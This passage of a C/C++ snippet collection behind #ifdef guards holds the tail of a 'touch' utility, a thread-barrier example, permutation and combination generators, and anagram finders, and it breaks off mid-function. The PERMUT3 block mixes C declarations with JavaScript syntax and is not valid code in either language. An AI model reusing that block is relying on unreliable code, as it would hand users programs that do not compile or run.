	if (!timeset)
		tv[1] = tv[0];

	if (*argv == NULL)
		usage();

	for (rval = 0; *argv; ++argv) {
		/* See if the file exists. */
		if (stat(*argv, &sb)) {
			if (!cflag) {
				/* Create the file. */
				fd = open(*argv,
				    O_WRONLY | O_CREAT, DEFFILEMODE);
				if (fd == -1 || fstat(fd, &sb) || close(fd)) {
					rval = 1;
					warn("%s", *argv);
					continue;
				}

				/* If using the current time, we're done. */
				if (!timeset)
					continue;
			} else
				continue;
		}

		if (!aflag)
			TIMESPEC_TO_TIMEVAL(&tv[0], &sb.st_atimespec);
		if (!mflag)
			TIMESPEC_TO_TIMEVAL(&tv[1], &sb.st_mtimespec);

		/* Try utimes(2). */
		if (!utimes(*argv, tv))
			continue;

		/* If the user specified a time, nothing else we can do. */
		if (timeset) {
			rval = 1;
			warn("%s", *argv);
		}

		/*
		 * System V and POSIX 1003.1 require that a NULL argument
		 * set the access/modification times to the current time.
		 * The permission checks are different, too, in that the
		 * ability to write the file is sufficient.  Take a shot.
		 */
		 if (!utimes(*argv, NULL))
			continue;

		/* Try reading/writing. */
		if (rw(*argv, &sb, fflag))
			rval = 1;
	}
	exit(rval);
}

#define	ATOI2(s)	((s) += 2, ((s)[-2] - '0') * 10 + ((s)[-1] - '0'))

void
stime_arg1(char *arg, struct timeval *tvp)
{
	struct tm *t;
	time_t tmptime;
	int yearset;
	char *p;
					/* Start with the current time. */
	tmptime = tvp[0].tv_sec;
	if ((t = localtime(&tmptime)) == NULL)
		err(1, "localtime");
					/* [[CC]YY]MMDDhhmm[.SS] */
	if ((p = strchr(arg, '.')) == NULL)
		t->tm_sec = 0;		/* Seconds defaults to 0. */
	else {
		if (strlen(p + 1) != 2)
			goto terr;
		*p++ = '\0';
		t->tm_sec = ATOI2(p);
	}
		
	yearset = 0;
	switch(strlen(arg)) {
	case 12:			/* CCYYMMDDhhmm */
		t->tm_year = ATOI2(arg) * 100 - TM_YEAR_BASE;
		yearset = 1;
		/* FALLTHROUGH */
	case 10:			/* YYMMDDhhmm */
		if (yearset) {
			yearset = ATOI2(arg);
			t->tm_year += yearset;
		} else {
			yearset = ATOI2(arg);
			if (yearset < 69)
				t->tm_year = yearset + 2000 - TM_YEAR_BASE;
			else
				t->tm_year = yearset + 1900 - TM_YEAR_BASE;
		}
		/* FALLTHROUGH */
	case 8:				/* MMDDhhmm */
		t->tm_mon = ATOI2(arg);
		--t->tm_mon;		/* Convert from 01-12 to 00-11 */
		t->tm_mday = ATOI2(arg);
		t->tm_hour = ATOI2(arg);
		t->tm_min = ATOI2(arg);
		break;
	default:
		goto terr;
	}

	t->tm_isdst = -1;		/* Figure out DST. */
	tvp[0].tv_sec = tvp[1].tv_sec = mktime(t);
	if (tvp[0].tv_sec == -1)
terr:		errx(1,
	"out of range or illegal time specification: [[CC]YY]MMDDhhmm[.SS]");

	tvp[0].tv_usec = tvp[1].tv_usec = 0;
}

void
stime_arg2(char *arg, int year, struct timeval *tvp)
{
	struct tm *t;
	time_t tmptime;
					/* Start with the current time. */
	tmptime = tvp[0].tv_sec;
	if ((t = localtime(&tmptime)) == NULL)
		err(1, "localtime");

	t->tm_mon = ATOI2(arg);		/* MMDDhhmm[YY] */
	--t->tm_mon;			/* Convert from 01-12 to 00-11 */
	t->tm_mday = ATOI2(arg);
	t->tm_hour = ATOI2(arg);
	t->tm_min = ATOI2(arg);
	if (year) {
		year = ATOI2(arg);
		if (year < 69)
			t->tm_year = year + 2000 - TM_YEAR_BASE;
		else
			t->tm_year = year + 1900 - TM_YEAR_BASE;
	}
	t->tm_sec = 0;

	t->tm_isdst = -1;		/* Figure out DST. */
	tvp[0].tv_sec = tvp[1].tv_sec = mktime(t);
	if (tvp[0].tv_sec == -1)
		errx(1,
	"out of range or illegal time specification: MMDDhhmm[YY]");

	tvp[0].tv_usec = tvp[1].tv_usec = 0;
}

void
stime_file(char *fname, struct timeval *tvp)
{
	struct stat sb;

	if (stat(fname, &sb))
		err(1, "%s", fname);
	TIMESPEC_TO_TIMEVAL(tvp, &sb.st_atimespec);
	TIMESPEC_TO_TIMEVAL(tvp + 1, &sb.st_mtimespec);
}

int
rw(char *fname, struct stat *sbp, int force)
{
	int fd, needed_chmod, rval;
	u_char byte;

	/* Try regular files and directories. */
	if (!S_ISREG(sbp->st_mode) && !S_ISDIR(sbp->st_mode)) {
		warnx("%s: %s", fname, strerror(EFTYPE));
		return (1);
	}

	needed_chmod = rval = 0;
	if ((fd = open(fname, O_RDWR, 0)) == -1) {
		if (!force || chmod(fname, DEFFILEMODE))
			goto err;
		if ((fd = open(fname, O_RDWR, 0)) == -1)
			goto err;
		needed_chmod = 1;
	}

	if (sbp->st_size != 0) {
		if (read(fd, &byte, sizeof(byte)) != sizeof(byte))
			goto err;
		if (lseek(fd, (off_t)0, SEEK_SET) == -1)
			goto err;
		if (write(fd, &byte, sizeof(byte)) != sizeof(byte))
			goto err;
	} else {
		if (write(fd, &byte, sizeof(byte)) != sizeof(byte)) {
err:			rval = 1;
			warn("%s", fname);
		} else if (ftruncate(fd, (off_t)0)) {
			rval = 1;
			warn("%s: file modified", fname);
		}
	}

	if (close(fd) && rval != 1) {
		rval = 1;
		warn("%s", fname);
	}
	if (needed_chmod && chmod(fname, sbp->st_mode) && rval != 1) {
		rval = 1;
		warn("%s: permissions modified", fname);
	}
	return (rval);
}

__dead void
usage(void)
{
	(void)fprintf(stderr,
	    "usage: touch [-acfm] [-r file] [-t time] file ...\n");
	exit(1);
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef BARRIER1

#define _REENTRANT

/* Include Files        */

#include	<thread.h>
#include	<errno.h>

/* Constants & Macros   *

/* Data Declarations    */

typedef struct {
     int     maxcnt;     /* maximum number of runners */
     struct _sb {
        cond_t  wait_cv;   /* cv for waiters at barrier */
        mutex_t wait_lk;   /* mutex for waiters at barrier */
        int     runners;   /* number of running threads */
     } sb[2];
     struct _sb   *sbp;    /* current sub-barrier */
} barrier_t;




/*
 * barrier_init - initialize a barrier variable.
 *
 */

int
barrier_init( barrier_t *bp, int count, int type, void *arg ) {
     int n;
     int i;

     if (count < 1)
         return(EINVAL);

     bp->maxcnt = count;
     bp->sbp = &bp->sb[0];

     for (i = 0; i < 2; ++i) {
#if defined(__cplusplus)
     struct barrier_t::_sb *sbp = &( bp->sb[i] );
#else
     struct _sb *sbp = &( bp->sb[i] );
#endif
     sbp->runners = count;

     if (n = mutex_init(&sbp->wait_lk, type, arg))
             return(n);

     if (n = cond_init(&sbp->wait_cv, type, arg))
             return(n);
     }
     return(0);
}

/*
 * barrier_wait - wait at a barrier for everyone to arrive.
 *
 */

int
barrier_wait(register barrier_t *bp) {
#if defined(__cplusplus)
     register struct barrier_t::_sb *sbp = bp->sbp;
#else
     register struct _sb *sbp = bp->sbp;
#endif
     mutex_lock(&sbp->wait_lk);

     if (sbp->runners == 1) {   /* last thread to reach barrier */
           if (bp->maxcnt != 1) {
           /* reset runner count and switch sub-barriers */
                  sbp->runners = bp->maxcnt;
                  bp->sbp = (bp->sbp == &bp->sb[0])
			                           ? &bp->sb[1] : &bp->sb[0];

                  /* wake up the waiters          */
                  cond_broadcast(&sbp->wait_cv);
            }
        } else {
           sbp->runners--;         /* one less runner  */

           while (sbp->runners != bp->maxcnt)
                  cond_wait( &sbp->wait_cv, &sbp->wait_lk);
        }

     mutex_unlock(&sbp->wait_lk);

     return(0);
}

/*
 * barrier_destroy - destroy a barrier variable.
 *
 */

int
barrier_destroy(barrier_t *bp) {
        int     n;
        int     i;

        for (i=0; i < 2; ++ i) {
                if (n = cond_destroy(&bp->sb[i].wait_cv))
                        return( n );

                if (n = mutex_destroy( &bp->sb[i].wait_lk))
                        return(n);
        }

        return(0);
}


#define NTHR    4
#define NCOMPUTATION 2
#define NITER   1000
#define NSQRT   1000

        void *
compute(barrier_t *ba )
{
	int count = NCOMPUTATION;

	while (count--) {
		barrier_wait( ba );
		/* do parallel computation */
	}
}

main( int argc, char *argv[] ) {
        int             i;
        int             niter;
        int             nthr;
        barrier_t       ba;
        double          et;
        thread_t        *tid;

        switch ( argc ) {
          default:
          case 3 :      niter   = atoi( argv[1] );
                        nthr    = atoi( argv[2] );
                        break;

          case 2 :      niter   = atoi( argv[1] );
                        nthr    = NTHR;
                        break;

          case 1 :      niter   = NITER;
                        nthr    = NTHR;
                        break;
        }

        barrier_init( &ba, nthr + 1, USYNC_THREAD, NULL );
        tid = (thread_t *) calloc(nthr, sizeof(thread_t));

        for (i = 0; i < nthr; ++i) {
                int     n;

                if (n = thr_create(NULL, 0, 
                        (void *(*)( void *)) compute,
                        &ba, NULL, &tid[i])) {
                            errno = n;
                            perror("thr_create");
                            exit(1);
                        }
        }

	for (i = 0; i < NCOMPUTATION; i++) {
        	barrier_wait(&ba );
		/* do parallel algorithm */
	}

	for (i = 0; i < nthr; i++) {
		thr_join(tid[i], NULL, NULL);
	}
		
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef PERMUT3

long d=0;
char a [1024] ;
GeneratePermutations()
{ 
	char inputstring[80] ;
	fgets (inputstring, 80, stdin) ;
	var chars="";
	var frequency=new Array();
	var ii, jj, cc, nn=1;
	for (ii=0; ii<inputstring.length; ii++)
	{ 
		cc=chars.indexOf(inputstring.charAt(ii));
		if (cc<0)
		{ 
			chars+=""+inputstring.charAt(ii);
			frequency[frequency.length]=1;
		}
		else
			frequency[cc]++;
	}
	d=0;
	for (ii=0; ii<frequency.length; ii++)
	{ 
		cc=frequency[ii];
		for (jj=0; jj<cc; jj++)
		{ 
			d++;
			a[d]=nn;
		}
		nn++;
	}
	tt="a=";
	for (ii=1; ii<=d; ii++) tt=tt+a[ii];
	tt=tt+"; d="+d;
	//  alert(tt);
	var display_list=window.document.interfaceform.display.checked;
	var allow_adjacent_equals=window.document.interfaceform.allow.checked;
	var perms=0;
	if (display_list) tt="";
	else tt=0;
	do
	{ 
		if ((allow_adjacent_equals)||(! Adjacent_equals()))
		{ 
			if (display_list)
			{ 
				for (ii=1; ii<=d; ii++) tt=tt+chars.charAt(a[ii]-1);
				tt=tt+" ";
			}
			else tt++;
		}
	}	  while(nextlong());
	window.document.interfaceform.perm.value=tt;
}
function Adjacent_equals()
{ 
	var ii;
	for (ii=1; ii<d; ii++)
	{ 
		if (a[ii]==a[ii+1]) return(true);
	}
	return(false);
}
function nextlong()
{ 
	var i, j, k, swap, s, si;
	for (k=d-1; k>=1; k--)
	{ 
		if (a[k]<a[k+1])
		{ 
			s=a[k+1];
			si=k+1;
			for (i=k+2; i<=d; i++)
			{ 
				if ((a[i]>a[k])&&(a[i]<s))
				{ 
					s=a[i];
					si=i;
				}
			}
			swap=a[si];
			a[si]=a[k];
			a[k]=swap;
			for (i=k+1; i<=d-1; i++)
			{ 
				for (j=i+1; j<=d; j++)
				{ 
					if (a[i]>a[j])
					{ 
						swap=a[i];
						a[i]=a[j];
						a[j]=swap;
					}
				}
			}
			return(true);
		}
		if (a[k]<s)
		{ 
			s=a[k];
			si=k;
		}
	}
	return(false);
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef COMBIN2BEST

#include<iostream>

using namespace std;

void char_combination(char n[],int n_column,
            char r[], int r_size, int r_column, int loop);

int main (int argc, char * * argv) {

	int N_NUM = atoi (*++argv) ; // set size (eg 5)
	int R_NUM = atoi (*++argv) ; // subset size (eg 3)
	
	char n[] = "abcdefghij" ; // "1234567890"

	char r[R_NUM+1];//+1 for the NULL character
	r[R_NUM]='\0';

	char_combination(n,0,r,R_NUM,0,N_NUM-R_NUM);
	
	return 0;
}

void char_combination(char n[],int n_column,
            char r[], int r_size, int r_column, int loop) {
	int localloop=loop;
	int local_n_column=n_column;
	
	if(r_column>(r_size-1)) {
		cout<<r<<endl;
		return;
	}
	
	for(int i=0;i<=loop;++i) {
		r[r_column]=n[n_column+i];
		++local_n_column;
		char_combination(n,local_n_column,r,r_size,r_column+1,localloop);
		--localloop;
	}
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef PERMUT2BEST

#include <stdio.h>

#define N 11

void prompt(void);
unsigned long int factorial(int);
void permute(int,int);
void print_tab(int);
char table[N];
int n=0;
unsigned long int r,nr=0;

int main(void) {
	prompt();

	r=factorial(n);

	permute(1,n);
}

void prompt(void) {
	char c;

	printf("Enter character string : ");
	while(n < N-1) {
		c=getchar();
		if(c=='\x0A') break;
		n=n+1;
		table[n-1]=c;
	}
	fflush(stdin);
}

unsigned long int factorial(int n) {
	if(n==0) return 1;
	else return n*factorial(n-1);
}

void permute(int i,int n) {
	int k,j;
	char t,tab[N];

	if(i==n)
		print_tab(n);
	else {
		for(j=0;j<n;j++)
			tab[j]=table[j];
		for(k=i;k<=n;k++) {
			permute(i+1,n);
			if(k != n) {
				t=tab[i-1];
				tab[i-1]=tab[k];
				tab[k]=t;
				for(j=0;j<n;j++)
					table[j]=tab[j];
			}
		}
	}
}

void print_tab(int n) {
	int j;

	nr++;
/*	printf("Perm. %6lu : ",nr);	*/
	for(j=0;j<n;j++) putchar(table[j]);
	putchar('\n');
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef COMBIN1

typedef struct 
{
  char* name;
  int   nres;
} User;
/* For example only: */
static User users[4] =
{
  { "A", 2 },
  { "B", 3 },
  { "C", 4 },
  { "D", 5 }
};

static void Print(const int resalloc[], int nusers)
{
  int i;
    
  for (i = 0; i < nusers; ++i)
  if (resalloc[i] >= 0)
    printf(" %d",resalloc[i]);
  else
    printf(" -");
  printf("\n");
}

static void RecEnum(const User* puser, int nusers, int resalloc[], int icurr)
{
  int i;
  int last = (icurr+1 == nusers);
    
  resalloc[icurr] = -1;
  if (puser[icurr].nres <= 0)
  {
    if (last)
      Print(resalloc,nusers);
    else
      RecEnum(puser,nusers,resalloc,icurr+1);
  }
  else
  for (i = 0; i < puser[icurr].nres; ++i)
  {
    resalloc[icurr] = i;
    if (last)
      Print(resalloc,nusers);    
    else
      RecEnum(puser,nusers,resalloc,icurr+1);
  }        
}

void Enum(const User users[], int nusers)
{
  int* p;
  int  i;

  if (nusers <= 0)
    return;
  p = (int*)malloc(sizeof(int)*nusers);
  for (i = 0; i < nusers; ++i)
    printf(" %s",users[i].name);
  printf("\n");
  RecEnum(users,nusers,p,0);
  free(p);
}

int main(int argc, char* argv[])
{
  Enum(users,4);
  return 0;
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef PERMUT1

#include <stdio.h>

/*
 * Permutation
 */

int factorial(int) ;
void getNextPermutation(char *, int) ;
void printPermutation(char *, int) ;
void swap(char *, int, int) ;
void reverseArray(char *, int) ;

/*
 * An example usage of the permutation.
 */
int main()
{
    int N = 4 ;
    char permutation[N] ;
    int i ;
    int bound ;

    permutation[0] = 'c' ;
    permutation[1] = 'd' ;
    permutation[2] = 'a' ;
    permutation[3] = 'b' ;

    /*
     * Compute the bound once rather than once per iteration.
     * Note that you have to call getNextPermutation at least
     * factorial(N) times, where N is the number of items in
     * your list, in order to get all possible permutations.
     * You can call it more than that, but the permutations
     * will start to repeat themselves.  Also, I have not
     * tested this to see what happens if you repeat items.
     * However, you shouldn't need to repeat them anyway.
     */
    bound = factorial(N) ;
    for(i = 0;i < bound;++i) {

        /* Order of these statements only determines if you see the
         * original, input sequence first or last. */
        printPermutation(permutation, N) ;
        getNextPermutation(permutation, N) ;
    } /* for */
} /* main */

/*
 * Input is an array representing a permutation and the number of
 * elements in it (indices from 0 to N-1, as usual in C).  The
 * input permutation is modified by side effects to be the next
 * lexicographic permutation from the input one.  You will need to
 * save the input array if its contents are important.  Repeated
 * calls * (N factorial of them, to be precise) will generate all
 * possible * permutations if you use the modified permutation as
 * input.
 */
void getNextPermutation(char *permutation, int N)
{
    int i = N - 1 ;
    int j = N ;

    while(i != 0 && permutation[i - 1] >= permutation[i]) {
        --i ;
    } /* while */

    /*
     * If i == 0, the array is complete reversed, so reverse it and
     * return the contents as the next permutation.
     */
    if (i == 0) {
        reverseArray(permutation, N) ;
        return ;
    } /* if */

    while(permutation[j - 1] <= permutation[i - 1]) {
        --j ;
    } /* while */

    swap(permutation, i - 1, j - 1) ;

    ++i ;
    j = N ;

    while(i < j) {
        swap(permutation, i - 1, j - 1) ;
        ++i ;
        --j ;
    } /* while */
} /* getNextPermutation */

/*
 * Helper functions.
 */

/*
 * Returns the factorial of N.
 */
int factorial(int N)
{
    int result = 1 ;
    int i ;

    for(i = 1;i <= N;++i) {
        result *= i ;
    } /* for */
    return(result) ;
} /* factorial */

/*
 * For the input character array, swaps the values at indices i and j.
 */
void swap(char *value, int i, int j)
{
    char tmp = value[i] ;
    value[i] = value[j] ;
    value[j] = tmp ;
} /* swap */

/*
 * Reverses all of the elements of the input array of size N.
 */
void reverseArray(char *permutation, int N)
{
    int i ;
    for(i = 0;i < N/2;++i) {
        swap(permutation, i, N - i - 1) ;
    }
} /* reverseArray */

/*
 * Prints the input permutation of size N.
 */
void printPermutation(char *permutation, int N)
{
    int i ;

    printf("Permutation: ") ;
    for(i = 0;i < N - 1;++i) {
        printf("%c, ", permutation[i]) ;
    } /* for */
    printf("%c\n", permutation[N - 1]) ;
} /* printPermutation */

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef ANAGRAM1

/*
 *	anagrams of a set of letters
 */

#include <stdio.h>
#include <string.h>
#include <malloc.h>

typedef struct dictent {
  struct dictent *alph;
  struct dictent *len;
  struct dictent *gl;
  char *word;
  int le;
} dent;

#define DE_SIZE		( sizeof( dent ) )

dent *sptr[26][40], *cptr[26][40], *aptr[26], *gptr[40];
char my_argv[10][50];
int tl, nlets[26], rl, reql[10], trl, stack[50];

void init_prog() { 
	int i, j;

	fprintf( stderr, "Initializing...\n" );
	for( i = 0; i < 26; i++ ) {
		aptr[i] = NULL;
		for( j = 1; j < 40; j++ ) {
			sptr[i][j] = NULL;
			cptr[i][j] = NULL;
		}
	}
}

void abort_prog( msg )
  char *msg;
{
	fprintf( stderr, msg );
	exit( 1 );
}

void read_dict() {
	FILE *fp;
	char word[40], *tword;
	dent *tdent, *wptr;
	int i, le, ai, wi;

	fp = fopen( "words", "r" );
	if( fp == NULL ) abort_prog( "Could not find dictionary file\n" );
	fprintf( stderr, "Reading dictionary...\n" );

	wptr = NULL;
	ai = 0;
	while( fscanf( fp, "%s", word ) != EOF ) {
		le = strlen( word );
		for( i = 0; i < le; i++ ) {
			if( word[i] >= 'A' && word[i] <= 'Z' ) word[i] += ( 'a' - 'A' );
			if( word[i] < 'a' || word[i] > 'z' ) break;
		}
		if( i != le ) continue;
		tdent = (dent *) malloc( DE_SIZE );
		tword = (char *) malloc( le + 1 );
		if( tdent == NULL || tword == NULL )
			abort_prog( "malloc() failed\n" );

		wi = word[0] - 'a';
		strcpy( tword, word );
		tdent->word = tword;
		tdent->le = le;
		tdent->alph = NULL;
		tdent->len = NULL;
		if( wptr == NULL ) aptr[ai++] = tdent;
		else {
			if( wptr->word[0] != word[0] ) aptr[ai++] = tdent;
			wptr->alph = tdent;
		}
		if( cptr[wi][le] == NULL ) {
			sptr[wi][le] = tdent;
			cptr[wi][le] = tdent;
		} else {
			cptr[wi][le]->len = tdent;
			cptr[wi][le] = tdent;
		}
		wptr = tdent;
	}
}

void check_dict() {
	int i;
	dent *pt;
	
	for( i = 0; i < 26; i++ ) printf( "%s ", aptr[i]->word );
	printf( "\n" );
	for( i = 1; i < 39; i++ )
		if( sptr[0][i] != NULL ) printf( "%s ", sptr[0][i]->word );
	printf( "\n" );
	pt = sptr[3][12];
	while( pt != NULL ) {
		printf( "%s ", pt->word );
		pt = pt->len;
	}
	printf( "\n" );
}

int get_args() {
	char inp;
	int i, j;

	printf( "Type in a list of letters, optionally followed by word lengths,\n" );
	printf( "optionally followed by word suggestions.  A blank line exits.\n" );
	printf( "-> " );

	i = 0;
	j = 0;
	do {
		scanf( "%c", &inp );
		if( inp > ' ' ) {
			if( j == 0 ) i++;
			if( inp >= 'A' && inp <= 'Z' ) inp += 'a' - 'A';
			my_argv[i][j++] = inp;
		} else {
			if( i > 0 ) my_argv[i][j] = '\0';
			j = 0;
		}
	} while( inp != '\n' );
	return( i - 1 );
}

int parse_args( nargs )
  int nargs;
{
	int i, j, c, t;

	for( i = 0; i < 26; i++ ) nlets[i] = 0;
	tl = strlen( my_argv[1] );
	for( i = 0; i < tl; i++ ) {
		c = my_argv[1][i];
		if( c < 'a' || c > 'z' ) break;
		nlets[c - 'a']++;
	}
	if( i != tl ) abort_prog( "Non-alphabetic characters in input set\n" );
	i = 2;
	rl = 0;
	while( i < nargs ) {
		if( my_argv[i][0] < '1' || my_argv[i][0] > '9' ) break;
		reql[rl++] = atoi( my_argv[i++] );
	}
	for( j = rl - 1; j > 0; j-- )
		for( c = 0; c < j; c++ )
			if( reql[c] < reql[c + 1] ) {
				t = reql[c];
				reql[c] = reql[c + 1];
				reql[c + 1] = t;
			}
	for( j = 0, trl = 0; j < rl; j++ ) trl += reql[j];
/*	for( i = 0; i < rl; i++ ) printf( "%2d ", reql[i] );
	printf( "\n" ); */
	return( i );
}

void find_valid_words() {
	int i, j, k, c, tn[26];
	dent *dptr, *tp[40];
	long checked, found, perc;

	checked = 0;
	found = 0;
	for( i = 0; i < 40; i++ ) gptr[i] = NULL;
	for( i = 0; i < 26; i++ ) {
		for( j = 1; j < 40; j++ ) {
			dptr = sptr[i][j];
			while( dptr != NULL ) {
				for( k = 0; k < 26; k++ ) tn[k] = nlets[k];
				for( k = 0; k < j; k++ ) {
					c = dptr->word[k] - 'a';
					if( --tn[c] < 0 ) break;
				}
				if( k == j ) {
					if( gptr[j] == NULL ) {
						gptr[j] = dptr;
						tp[j] = dptr;
					} else {
						tp[j]->gl = dptr;
						tp[j] = dptr;
					}
					dptr->gl = NULL;
					found++;
				}
				dptr = dptr->len;
				checked++;
			}
		}
	}
	perc = 1000 - ( ( found * 10000 + 5 ) / 10 ) / checked;
	fprintf( stderr, "eliminated %2d.%d%% of words\n", perc / 10, perc % 10 );
/*	for( i = 1; i < 40; i++ ) {
		if( gptr[i] != NULL ) printf( "%s ", gptr[i]->word );
	}
	printf( "\n" ); */
}

void do_search( es, sw )
  char *es, *sw;
{
	int i, j, slev, tn[26], cl, co, cp, rs, rs2;
	long na;
	dent *sp[50];

	na = 0;
	co = 0;
	fprintf( stderr, "%sGoing through dictionary...", es );
	find_valid_words();
	fprintf( stderr, "%sStarting search...\n", es );
	for( i = 0; i < 50; i++ ) {
		stack[i] = 0;
		sp[i] = NULL;
	}
	cl = tl;
	slev = 0;
	stack[0] = 1;
	sp[0] = gptr[1];
	for( ;; ) {
		for( i = 0, j = 0, rs = tl, rs2 = trl; i < rl && j <= slev; ) {
			if( stack[j] >= reql[i] ) {
				rs -= stack[j];
				if( stack[j] == reql[i] ) {
					rs2 -= stack[j];
					i++;
				}
				if( rs < rs2 ) {
					j = -1;
					break;
				}
				j++;
			} else {
				j = -1;
				break;
			}
		}
		if( j == -1 ) sp[slev] = NULL;
		while( sp[slev] != NULL ) {
			for( i = 0; i < 26; i++ ) tn[i] = nlets[i];
			for( i = 0; i < stack[slev]; i++ ) {
				if( --tn[( (int) sp[slev]->word[i] ) - 'a'] < 0 ) break;
			}
			if( i == stack[slev] ) break;
			else sp[slev] = sp[slev]->gl;
		}
		if( sp[slev] == NULL ) {
			if( slev != 0 ) {
				if( stack[slev] < stack[slev - 1] && cl - stack[slev] > 0 ) {
					stack[slev]++;
					if( stack[slev] != stack[slev - 1] )
						sp[slev] = gptr[stack[slev]];
					else sp[slev] = sp[slev - 1];
				} else {
					stack[slev] = 0;
					sp[slev] = NULL;
					slev--;
					for( i = 0; i < stack[slev]; i++ )
						nlets[( (int) sp[slev]->word[i] ) - 'a']++;
					sp[slev] = sp[slev]->gl;
					cl += stack[slev];
				}
			} else {
				if( stack[0] < tl ) {
					stack[0]++;
					sp[0] = gptr[stack[0]];
				} else break;
			}
		} else {
			if( cl > stack[slev] ) {
				for( i = 0; i < 26; i++ ) nlets[i] = tn[i];
				cl -= stack[slev];
				slev++;
				stack[slev] = 1;
				sp[slev] = gptr[1];
			} else {
				cp = tl + slev + 3;
				if( sw != NULL ) cp += 1 + strlen( sw );
				if( co + cp > 79 ) {
					co = cp;
					printf( "\n" );
				} else co += cp;
				printf( "(" );
				if( sw != NULL ) printf( "%s ", sw );
				for( i = 0; i <= slev; i++ ) {
					printf( "%s", sp[i]->word );
					if( i != slev ) printf( " " );
					else printf( ") " );
				}
				na++;
				sp[slev] = sp[slev]->gl;
			}
		}
	}
	printf( "\n*** Total number of anagrams found: %d\n", na );
}

void search( suggp, sugg )
  int suggp, sugg;
{
	int i, j, c, tn[26];

	if( suggp == sugg ) {
		do_search( "", NULL );
		return;
	}
	for( i = suggp; i < sugg; i++ ) {
		printf( "Target letters: %s\n", my_argv[i] );
		for( j = 0; j < 26; j++ ) tn[j] = nlets[j];
		for( j = 0; j < strlen( my_argv[i] ); j++ ) {
			c = my_argv[i][j];
			if( c < 'a' || c > 'z' ) break;
			if( --tn[c - 'a'] < 0 ) break;
		}
		if( j == strlen( my_argv[i] ) ) {
			for( j = 0; j < 26; j++ ) nlets[j] = tn[j];
			tl -= strlen( my_argv[i] );
			do_search( "*** ", my_argv[i] );
			for( j = 0; j < strlen( my_argv[i] ); j++ )
				nlets[( (int) my_argv[i][j] ) - 'a']++;
			tl += strlen( my_argv[i] );
		}
	}
}

void main( argc, argv )
  int argc;
  char **argv;
{
	int nargs;

	init_prog();
	read_dict();
	if( argc == 1 ) {
		for( ;; ) {
			nargs = get_args();
			if( nargs == -1 ) exit( 0 );
			search( parse_args( nargs + 2 ), nargs + 2 );
		}
	} else {
		for( nargs = 1; nargs < argc; nargs++ )
			strcpy( my_argv[nargs], argv[nargs] );
		search( parse_args( argc ), argc );
		exit( 0 );
	}
}

# endif

/*	____	____	____	____	____	____	____	____	*/

# ifdef ANAGRAM2

/*************************************************************************
* 
* File:     anagram.C
* Author:   Tim Nevaker
* Class:    CMSC 443
* Date:     May 4, 2000
*
* Compilation:
* CC -o anagram anagram.C
*
* Usage:
* anagram [-o output-file] [-d dictionary-file] [-l minimum-word-size]
*
* Description:
* This program takes a word and produces as many anagrams as possible.
* The program uses a dictionary file of words, one word per line, as 
* the possible words from which the anagrams are formed. The default
* dictionary file is dictionary.txt, which contains approximately
* 27,000 words. A different dictionary file can be specified at the
* command prompt, using the -d "dictionary-file" option.
* The anagrams produced are printed to a text file, one anagram per
* line. The output file may be specified at the command prompt using
* the -o "output-file" option, or else the user will be prompted for
* the name of the output file from within the program.
* Additionally, the user may limit the choice of words considered for
* the anagrams using the -l "minimum-word-size" option. A number after
* the -l flag indicates the minimum length of any word in the anagram.
*
* Implementation:
* The program loads the dictionary file into memory in an array. Dynamic
* memory allocation is used to ensure that no more memory is used than 
* is needed to store the words. After the user enters the word to be
* anagrammed, the program first creates a "working dictionary" by 
* filtering out any words that cannot be contained within the input
* text. Words that are longer than the input text, or are shorter than
* the user-specified minimum length are discarded, as are words that
* contain more of a particular letter than the input text.
* After filtering, the working dictionary is then sorted by word-length,
* with longer words at the top and shorter words at the bottom. Due to
* the way the anagrams are created, this sorting order ensures that
* anagrams with the longest words appear at the top of the list of 
* anagrams.
* The findAnagrams() function is a recursive function that operates in
* the following manner. The functions finds the first word in the
* working dictionary that is contained within the input text. It then
* calls itself recursively, to anagram the remaining letters of the
* input text. One base case of the recursion occurs when all the letters
* of the input text have been used, which indicates that an anagram has
* been found. In this case, the anagram is printed to the output file.
* The other base case occurs when the working dictionary is exhausted 
* of potential words, but not all letters of the input text have been
* used. This indicates a dead end in the anagramming process, in which
* case the recursion returns without printing, and a new recursion is
* begun. The current anagram is stored in a local string variable that
* is passed down the recursion, and appended to until the final anagram
* is produced and printed. The recursion uses a reference to an index
* of the working dictionary to keep track of its position in the 
* working dictionary throughout the recursive process. This guarantees
* that multiple instances of the same anagram are not produced.
*
*************************************************************************/

#include <iostream.h>
#include <stdlib.h>
#include <fstream.h>
#include <string.h>
#include <ctype.h>

// Global constants
const int MaxWordLength = 256;

// Global variables
long wordcount = 0;
long dictSize  = 0;
char **dictionary;
char **workingDict;
ofstream out;

// Function prototypes
bool initializeDict(const char *dictFile);
void findAnagrams(char *str, int alphaCount[26], int &dictPtr, unsigned int letterCount);
int  charcmp(const void *c1, const void *c2);
int  sizecmp(const void *s1, const void *s2);
int  alphalen(const char *str);
void strupper(char *str);
void emptyDict();

int main(int argc, char *argv[])
{
    // Program defaults
    const char *DefaultDict = "dictionary.txt";

    // Initialize the dictionary arrays
    char *dictFile = (char *) DefaultDict;
    char *outFile = NULL;
    int  minWordSize = 1;
    int  i = 0;

    // Parse command-line arguments
    if (argc > 1)
    {
        for (i = 1; i < argc; i++)
        {
            if (strcmp(argv[i], "-d") == 0)
                dictFile = argv[i+1];
            else if (strcmp(argv[i], "-o") == 0)
                outFile = argv[i+1];
            else if (strcmp(argv[i], "-l") == 0)
                minWordSize = atoi(argv[i+1]);
        }
    }

    // Initialize dictionary
    if ( !initializeDict(dictFile) )
    {
        cerr << "Error: Could not initialize dictionary" << endl;
        exit(1);
    }

    // Prompt user for output file
    char buffer[MaxWordLength];

    if (outFile == NULL)
    {
        cout << "Enter the name of the output file: ";
        cin.getline(buffer, MaxWordLength);
        outFile = new char[strlen(buffer) + 1];
        strcpy(outFile, buffer);
    }

    // Open output stream for file output
    out.open(outFile);

    // Prompt user for input word/phrase
    cout << "Enter word or phrase to anagram: ";
    cin.getline(buffer, MaxWordLength);
    strupper(buffer);

    // Store count of characters in an array for use in anagramming
    int  alphaCount[26];
    int  letterCount = 0;
    unsigned int j = 0;
    for (i = 0; i < 26; i++)
        alphaCount[i] = 0;

    for (j = 0; j < strlen(buffer); j++)
    {
